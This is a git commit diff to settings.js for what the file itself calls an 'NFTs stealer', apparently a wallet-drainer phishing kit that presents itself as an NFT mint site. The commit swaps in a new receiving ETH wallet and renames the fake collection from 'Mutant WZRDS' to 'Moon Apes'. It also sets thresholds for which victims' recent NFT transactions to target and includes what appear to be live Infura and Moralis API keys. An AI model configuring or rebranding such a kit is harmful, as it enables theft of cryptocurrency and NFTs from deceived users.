b25a52cadd0614de3ed7d77435eb0833109143bf
nonfungiblesolana <103703809+nonfungiblesolana@users.noreply.github.com>
2022-07-13 14:22:00 +0200

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,11 +1,11 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "0x261A1f18d7681A1fe175b80229155ac690bACB5a";    // Your ETH wallet that you have to receive NFTs
+const address = "0xCc29637C3b6151eE71CE13Bc7dE6fb077D2dD512";    // Your ETH wallet that you have to receive NFTs
 const infuraId = "52cf9376ca0149889215a557c6ef7c53"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "UFZFSHwkweXCj3FHGZHXxFITwXNVYgMog2wk5kq60hpmR2HFUxKt8Rz1uZQmbkE2"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "Mutant WZRDS",
-    title: "Mutant WZRDS", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    name: "Moon Apes",
+    title: "Moon Apes", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: "12.07.2022",
     socialMedia: {
         discord: "https://discord.gg/example",
@@ -34,7 +34,7 @@ const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.03,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 1000, // Maximum number of days to check for the last transactions.
-    receiveAddress: "0x261A1f18d7681A1fe175b80229155ac690bACB5a" // leave empty if you want to use the same address 
+    receiveAddress: "" // leave empty if you want to use the same address 
 }
 
 /* 
